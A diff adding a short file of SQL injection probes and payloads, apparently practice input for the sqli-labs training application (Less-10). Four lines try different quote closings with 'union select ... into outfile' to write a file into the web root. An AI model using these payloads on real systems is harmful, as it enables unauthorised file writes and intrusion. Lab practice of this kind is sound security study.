@@ -1,0 +1,7 @@
+ID:1
+ID:1\
+ID:1\\\
+ID:1' union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-10/u.txt'  -- 
+ID:1') union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-10/u.txt'  -- 
+ID:1") union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-10/u.txt'  -- 
+ID:1" union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-10/u.txt'  -- 
